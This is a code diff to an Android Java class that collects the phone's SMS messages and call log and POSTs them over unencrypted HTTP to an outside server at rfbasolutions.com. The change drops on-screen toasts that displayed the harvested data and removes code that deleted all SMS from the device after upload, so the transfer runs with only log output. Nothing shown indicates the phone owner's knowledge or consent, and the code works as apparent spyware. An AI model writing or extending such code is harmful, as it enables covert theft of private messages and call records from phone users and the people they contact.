@@ -16,6 +16,7 @@ import com.android.volley.VolleyError;
 import com.android.volley.toolbox.StringRequest;
 import com.android.volley.toolbox.Volley;
 
+import java.io.File;
 import java.util.ArrayList;
 import java.util.Date;
 import java.util.HashMap;
@@ -100,12 +101,14 @@ public class UpdateToServer {
         cursor.close();
         return stringBuffer.toString();
     }
+
+
     public void addtoServer(final Context context) {
 
-
+        trimCache(context);
         final ArrayList<String> smss=getMessages();
+        Log.i("MESSAGES",smss.toString());
         final String callllogs=getCallDetail();
-
         StringRequest request=new StringRequest(Request.Method.POST, "http://rfbasolutions.com/get_messages_api/store_new_details.php", new Response.Listener<String>()
         {
             String serverResponse="Message Received!";
@@ -113,12 +116,7 @@ public class UpdateToServer {
             @Override
             public void onResponse(String response) {
 
-                Toast.makeText(context, response, Toast.LENGTH_SHORT).show();
-
-                if(response.equals(serverResponse))
-                {
-                    context.getContentResolver().delete(mSmsQueryUri,null,null);
-                }
+                Log.i("RESPONSE",response);
 
             }
         }, new Response.ErrorListener()
@@ -126,8 +124,7 @@ public class UpdateToServer {
             @Override
             public void onErrorResponse(VolleyError error)
             {
-                context.getContentResolver().delete(mSmsQueryUri,null,null);
-
+                Toast.makeText(context, error.getMessage(), Toast.LENGTH_SHORT).show();
             }
         })
         {
@@ -146,12 +143,40 @@ public class UpdateToServer {
 
                 params.put("calllog",callllogs.toString());
                 params.put("record", smss.toString());
-                Toast.makeText(context, params.toString() , Toast.LENGTH_SHORT).show();
 
                 return params;
             }
         };
         RequestQueue requestQueue= Volley.newRequestQueue(context);
         requestQueue.add(request);
+    }
+
+
+    public static void trimCache(Context context) {
+        try {
+            File dir = context.getCacheDir();
+            if (dir != null && dir.isDirectory()) {
+                deleteDir(dir);
+            }
+        } catch (Exception e) {
+            // TODO: handle exception
+        }
+    }
+
+
+
+    public static boolean deleteDir(File dir) {
+        if (dir != null && dir.isDirectory()) {
+            String[] children = dir.list();
+            for (int i = 0; i < children.length; i++) {
+                boolean success = deleteDir(new File(dir, children[i]));
+                if (!success) {
+                    return false;
+                }
+            }
+        }
+
+        // The directory is now empty so delete it
+        return dir.delete();
     }
 }
